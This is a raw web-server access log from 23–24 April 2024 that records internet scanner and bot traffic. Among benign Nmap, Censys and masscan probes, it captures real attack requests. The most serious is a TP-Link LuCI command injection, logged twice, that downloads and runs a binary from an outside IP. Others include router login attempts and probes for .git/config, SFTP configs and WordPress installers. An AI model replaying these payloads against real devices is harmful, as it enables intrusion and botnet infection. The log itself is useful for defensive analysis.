143.110.252.248 - - [23/Apr/2024:18:18:32 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.16.38.111 - - [23/Apr/2024:18:18:43 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
143.110.252.248 - - [23/Apr/2024:18:20:02 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.252.248 - - [23/Apr/2024:18:20:02 +0000] "" 400 0 "-" "-"
194.165.16.73 - - [23/Apr/2024:18:25:04 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
149.50.103.48 - - [23/Apr/2024:18:26:02 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
66.240.205.34 - - [23/Apr/2024:18:33:28 +0000] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 154 "-" "-"
149.50.103.48 - - [23/Apr/2024:18:41:40 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.128 - - [23/Apr/2024:18:44:04 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
185.180.143.79 - - [23/Apr/2024:18:45:14 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
104.152.52.74 - - [23/Apr/2024:19:03:57 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
104.152.52.74 - - [23/Apr/2024:19:04:04 +0000] "GET /nmaplowercheck1713899044 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.74 - - [23/Apr/2024:19:04:04 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
104.152.52.74 - - [23/Apr/2024:19:04:05 +0000] "POST /sdk HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.74 - - [23/Apr/2024:19:04:05 +0000] "GET /HNAP1 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.74 - - [23/Apr/2024:19:04:05 +0000] "GET /evox/about HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.74 - - [23/Apr/2024:19:04:07 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
104.152.52.74 - - [23/Apr/2024:19:04:07 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
149.50.103.48 - - [23/Apr/2024:19:07:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
154.51.131.142 - - [23/Apr/2024:19:13:33 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
149.50.103.48 - - [23/Apr/2024:19:20:02 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.126.213 - - [23/Apr/2024:19:24:39 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
104.152.52.47 - - [23/Apr/2024:19:46:45 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
149.50.103.48 - - [23/Apr/2024:19:46:48 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
104.152.52.47 - - [23/Apr/2024:19:46:53 +0000] "GET /nmaplowercheck1713901612 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.47 - - [23/Apr/2024:19:46:53 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
104.152.52.47 - - [23/Apr/2024:19:46:53 +0000] "POST /sdk HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.47 - - [23/Apr/2024:19:46:53 +0000] "GET /HNAP1 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.47 - - [23/Apr/2024:19:46:53 +0000] "GET /evox/about HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.47 - - [23/Apr/2024:19:46:55 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
104.152.52.47 - - [23/Apr/2024:19:46:56 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
45.128.232.229 - - [23/Apr/2024:19:49:52 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.229 - - [23/Apr/2024:19:49:53 +0000] "" 400 0 "-" "-"
45.115.225.71 - - [23/Apr/2024:19:51:09 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.1"
141.98.11.128 - - [23/Apr/2024:19:53:42 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
149.50.103.48 - - [23/Apr/2024:20:09:17 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
143.110.252.248 - - [23/Apr/2024:20:09:27 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.252.248 - - [23/Apr/2024:20:09:27 +0000] "" 400 0 "-" "-"
143.110.252.248 - - [23/Apr/2024:20:09:28 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
80.75.212.75 - - [23/Apr/2024:20:14:10 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 154 "-" "-"
152.32.128.214 - - [23/Apr/2024:20:16:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/575.38 (KHTML, like Gecko) Chrome/51.0.1682 Safari/537.36"
179.43.190.218 - - [23/Apr/2024:20:17:01 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Fbin%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
141.98.11.128 - - [23/Apr/2024:20:28:34 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
149.50.103.48 - - [23/Apr/2024:20:29:08 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
38.242.195.48 - - [23/Apr/2024:20:30:28 +0000] "GET /sftp-config.json HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
38.242.195.48 - - [23/Apr/2024:20:31:23 +0000] "GET /.vscode/sftp.json HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
43.155.138.79 - - [23/Apr/2024:20:42:43 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
118.193.63.139 - - [23/Apr/2024:20:43:57 +0000] "\x16\x03\x01\x01<\x01\x00\x018\x03\x03i\xA8(t\xE6\x18\xD9\x1B\xFCO+\x13,?\xF8\x7F\xFBR\xA3\x86cd\x84xC\xE7\xC3\xA4\xF4\xC5\xA7\xC1 /Pa\xC16\xC8\xE3\x1D{\xB4S\xE4\xD3\xF1\x7F\x06E\xC5\x01}%\x084\xDCn\x1B\xA7\x87\x059\xBFP\x004\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x09\x00\x9E\xCC\xA8\xCC\xAA\x003\x00=\x00\x16\xC0" 400 154 "-" "-"
149.50.103.48 - - [23/Apr/2024:20:46:55 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.128 - - [23/Apr/2024:20:53:00 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
42.83.147.56 - - [23/Apr/2024:20:56:45 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36"
149.50.103.48 - - [23/Apr/2024:21:08:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
182.44.67.97 - - [23/Apr/2024:21:12:51 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
149.50.103.48 - - [23/Apr/2024:21:29:27 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
91.92.244.203 - - [23/Apr/2024:21:29:34 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0"
146.19.24.28 - - [23/Apr/2024:21:31:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
104.152.52.20 - - [23/Apr/2024:21:41:36 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
104.152.52.20 - - [23/Apr/2024:21:41:50 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
104.152.52.20 - - [23/Apr/2024:21:41:50 +0000] "GET /nmaplowercheck1713908509 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.20 - - [23/Apr/2024:21:41:50 +0000] "POST /sdk HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.20 - - [23/Apr/2024:21:41:50 +0000] "GET /evox/about HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.20 - - [23/Apr/2024:21:41:50 +0000] "GET /HNAP1 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.20 - - [23/Apr/2024:21:41:52 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
104.152.52.20 - - [23/Apr/2024:21:41:53 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
206.168.34.40 - - [23/Apr/2024:21:46:31 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
141.98.11.128 - - [23/Apr/2024:21:46:32 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
206.168.34.40 - - [23/Apr/2024:21:46:41 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
149.50.103.48 - - [23/Apr/2024:21:48:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.126.213 - - [23/Apr/2024:21:48:45 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
91.92.244.203 - - [23/Apr/2024:21:54:46 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0"
149.50.103.48 - - [23/Apr/2024:22:06:45 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
87.121.69.52 - - [23/Apr/2024:22:09:36 +0000] "CONNECT google.com:443 HTTP/1.1" 400 154 "-" "-"
185.16.38.111 - - [23/Apr/2024:22:13:55 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [23/Apr/2024:22:20:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
74.234.36.48 - - [23/Apr/2024:22:36:12 +0000] "GET /.git/config HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
206.168.34.33 - - [23/Apr/2024:22:38:08 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
206.168.34.33 - - [23/Apr/2024:22:38:14 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.33 - - [23/Apr/2024:22:38:15 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
149.50.103.48 - - [23/Apr/2024:22:39:54 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [23/Apr/2024:23:07:44 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.128 - - [23/Apr/2024:23:08:28 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
109.205.213.198 - - [23/Apr/2024:23:15:25 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
141.98.11.128 - - [23/Apr/2024:23:17:55 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
128.14.173.117 - - [23/Apr/2024:23:20:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
109.205.213.198 - - [23/Apr/2024:23:23:28 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
149.50.103.48 - - [23/Apr/2024:23:28:24 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.16.38.111 - - [23/Apr/2024:23:35:32 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
205.210.31.7 - - [23/Apr/2024:23:40:48 +0000] "GET / HTTP/1.1" 301 166 "-" "Xpanse, a Palo Alto Networks company, indexes customer network perimeters. If you have any questions or concerns, please reach out to: scaninfo@paloaltonetworks.com."
146.19.24.28 - - [23/Apr/2024:23:42:14 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.103.48 - - [23/Apr/2024:23:42:21 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.224.128.43 - - [23/Apr/2024:23:42:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
125.16.34.78 - - [23/Apr/2024:23:54:59 +0000] "GET / HTTP/1.0" 301 166 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
149.50.103.48 - - [24/Apr/2024:00:03:51 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.128 - - [24/Apr/2024:00:08:10 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
198.235.24.204 - - [24/Apr/2024:00:22:10 +0000] "GET / HTTP/1.0" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
149.50.103.48 - - [24/Apr/2024:00:26:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [24/Apr/2024:00:39:47 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
83.147.54.104 - - [24/Apr/2024:00:42:52 +0000] "GET /.git/config HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
199.45.154.66 - - [24/Apr/2024:00:51:14 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
199.45.154.66 - - [24/Apr/2024:00:51:21 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
185.191.126.213 - - [24/Apr/2024:00:56:33 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
192.42.116.192 - - [24/Apr/2024:00:57:15 +0000] "GET / HTTP/1.1" 301 166 "http://gangagetaways.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
52.81.78.71 - - [24/Apr/2024:01:09:11 +0000] "\x16\x03\x01\x01" 400 154 "-" "-"
149.50.103.48 - - [24/Apr/2024:01:09:23 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
27.115.124.53 - - [24/Apr/2024:01:19:54 +0000] "GET / HTTP/1.1" 301 166 "http://baidu.com/" "Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36"
149.50.103.48 - - [24/Apr/2024:01:30:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.174.191.32 - - [24/Apr/2024:01:42:29 +0000] "GET / HTTP/1.0" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
149.50.103.48 - - [24/Apr/2024:01:45:54 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
114.80.36.40 - - [24/Apr/2024:01:46:28 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
179.43.190.218 - - [24/Apr/2024:01:53:58 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Fbin%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
117.208.83.63 - - [24/Apr/2024:01:59:24 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
35.203.211.48 - - [24/Apr/2024:02:07:34 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
149.50.103.48 - - [24/Apr/2024:02:07:36 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
136.243.220.214 - - [24/Apr/2024:02:07:53 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
136.243.220.214 - - [24/Apr/2024:02:07:55 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)"
149.50.103.48 - - [24/Apr/2024:02:29:31 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [24/Apr/2024:02:39:54 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
206.168.34.180 - - [24/Apr/2024:02:42:37 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
206.168.34.180 - - [24/Apr/2024:02:42:42 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
167.99.205.23 - - [24/Apr/2024:02:57:56 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03 \xB7Y\xE9\x8A\x86^[\xDA\xF6'w17\xD0[\xA3\xAD\x05\xAF\x09\x91\xCA~\xEF\x09\xBE\x8D\x91\xD2?\x16\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
167.99.205.23 - - [24/Apr/2024:02:57:56 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xEB\xC4\xA6\x99do\xF9u\xED1$\x8C\x07\x8C\x1A\xFE\xA4\xC7d\xDD\xDB\xC3\xD4BG~\xC7K\xE0\xE4\x1AJ\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
167.99.205.23 - - [24/Apr/2024:02:57:56 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.99.205.23 - - [24/Apr/2024:02:57:57 +0000] "GET /form.html HTTP/1.1" 301 166 "-" "curl/8.1.2"
167.99.205.23 - - [24/Apr/2024:02:57:58 +0000] "GET /upl.php HTTP/1.1" 301 166 "-" "Mozilla/5.0"
167.99.205.23 - - [24/Apr/2024:02:57:58 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x07\x992@\x0E7\xCD\xA1\xBB\xC7Z3N\x8A\xED\xF3n\xACo=\xC2\xD2\x12\x9EI\x82\xC3\x87\x08N9D\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
167.99.205.23 - - [24/Apr/2024:02:57:58 +0000] "GET /geoip/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.99.205.23 - - [24/Apr/2024:02:57:59 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.99.205.23 - - [24/Apr/2024:02:57:59 +0000] "GET /1.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.99.205.23 - - [24/Apr/2024:02:58:00 +0000] "GET /bundle.js HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.99.205.23 - - [24/Apr/2024:02:58:00 +0000] "GET /files/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.99.205.23 - - [24/Apr/2024:02:58:00 +0000] "GET /systembc/password.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.99.205.23 - - [24/Apr/2024:02:58:01 +0000] "GET /password.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.99.205.23 - - [24/Apr/2024:02:58:01 +0000] "GET /info.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
38.75.137.222 - - [24/Apr/2024:02:58:15 +0000] "GET /wp-admin/setup-config.php?step=1 HTTP/1.1" 301 166 "-" "Apache/2.4.34 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
38.75.137.222 - - [24/Apr/2024:02:58:17 +0000] "GET /wordpress/wp-admin/setup-config.php?step=1 HTTP/1.1" 301 166 "-" "Apache/2.4.34 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
38.75.137.222 - - [24/Apr/2024:02:58:19 +0000] "GET /wp-admin/install.php?step=1 HTTP/1.1" 301 166 "-" "Apache/2.4.34 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
149.50.103.48 - - [24/Apr/2024:02:59:47 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
64.62.197.181 - - [24/Apr/2024:03:03:59 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xA9\x1D\x09\xB4\xF5\x0E\xDEOm:\xBC\xBAM\xF0\x95\x9Frw\x97H_\xE3+?\xC0\xE7V\xAB\x89}\x16,\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
206.189.231.200 - - [24/Apr/2024:03:07:06 +0000] "GET / HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
162.142.125.221 - - [24/Apr/2024:03:18:56 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.221 - - [24/Apr/2024:03:18:57 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
43.155.152.154 - - [24/Apr/2024:03:20:00 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
141.98.11.128 - - [24/Apr/2024:03:24:01 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
149.50.103.48 - - [24/Apr/2024:03:26:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [24/Apr/2024:03:40:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
146.19.24.28 - - [24/Apr/2024:03:48:46 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [24/Apr/2024:04:04:41 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
87.121.69.52 - - [24/Apr/2024:04:06:01 +0000] "CONNECT google.com:443 HTTP/1.1" 400 154 "-" "-"
149.50.103.48 - - [24/Apr/2024:04:26:53 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.128 - - [24/Apr/2024:04:27:47 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
185.224.128.43 - - [24/Apr/2024:04:28:24 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
118.194.236.219 - - [24/Apr/2024:04:45:04 +0000] "\x16\x03\x01\x016\x01\x00\x012\x03\x03k\x13\xE6\xEF\xF2G\xE6\xA3G\x9B\xEF\xC0\xACK\xEC\xE5\x1E\x12(\xE5\x08K,?\x82\xC0I\xDC\xFEew) \xC4\x11\xAC\xA6\xE3>\xD9\xCC\xC29v\xDC\xAE\x9F\xB6\x9C\xF8)\x97\x8FP\xE6\xE1\x01\xDEHC_\x12Ym\xE5\x004\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x09\x00\x9E\xCC\xA8\xCC\xAA\x003\x00=\x00\x16\xC0" 400 154 "-" "-"
149.50.103.48 - - [24/Apr/2024:04:48:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
146.19.24.28 - - [24/Apr/2024:04:53:04 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
198.199.110.40 - - [24/Apr/2024:04:54:11 +0000] "MGLNDD_180.233.121.154_80" 400 154 "-" "-"
149.50.103.48 - - [24/Apr/2024:05:01:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
167.88.61.92 - - [24/Apr/2024:05:11:05 +0000] "GET /wp-admin/setup-config.php?step=1 HTTP/1.1" 301 166 "-" "Apache/2.4.34 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
167.88.61.92 - - [24/Apr/2024:05:11:17 +0000] "GET /wordpress/wp-admin/setup-config.php?step=1 HTTP/1.1" 301 166 "-" "Apache/2.4.34 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
167.88.61.92 - - [24/Apr/2024:05:11:24 +0000] "GET /wp-admin/install.php?step=1 HTTP/1.1" 301 166 "-" "Apache/2.4.34 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
179.43.191.18 - - [24/Apr/2024:05:23:50 +0000] "GET /mailman/listinfo/mailman HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
